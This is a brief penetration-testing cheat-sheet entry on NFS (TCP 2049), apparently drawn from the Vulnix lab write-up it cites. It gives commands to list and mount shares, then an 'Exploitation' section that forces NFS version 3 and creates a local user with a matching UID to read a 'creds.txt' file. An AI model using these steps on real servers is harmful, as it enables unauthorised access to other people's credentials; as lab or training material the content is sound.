# TCP 2049: NFS

> Network File System is a distributed file system protocol originally developed by Sun Microsystems in 1984, allowing a user on a client computer to access files over a computer network much like local storage is accessed.   
>
>  -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Network_File_System)</cite>

## Basics

Show mounts
```bash
sudo showmount -e <ip>
```

Mount
```bash
sudo mkdir /mnt/<share>
sudo mount <ip>:/<share> /mnt/<share>
```

## Exploitation

If permissions are "65534 / nobody", "4294967294 / UNKNOWN"
```
-rwx------ 1 nobody 4294967294   48 Oct 28  2019 creds.txt
```

Try to use nfs version 3
```bash
mount -t nfs -o vers=3 <ip>:/<share> <share>
```

```
-rwx------ 1 1014 1014   48 Oct 28  2019 creds.txt
```

Now all that's left is to create a user with that id, to access the file
```bash
groupadd --gid 1014 nfsgroup
useradd --uid 1014 --groups nfsgroup nfsuser
sudo -u nfsuser ls -l
```

Source: [Write-up Vulnix - playing around with NFS - Christophe Tafani-Dereeper](https://blog.christophetd.fr/write-up-vulnix/)
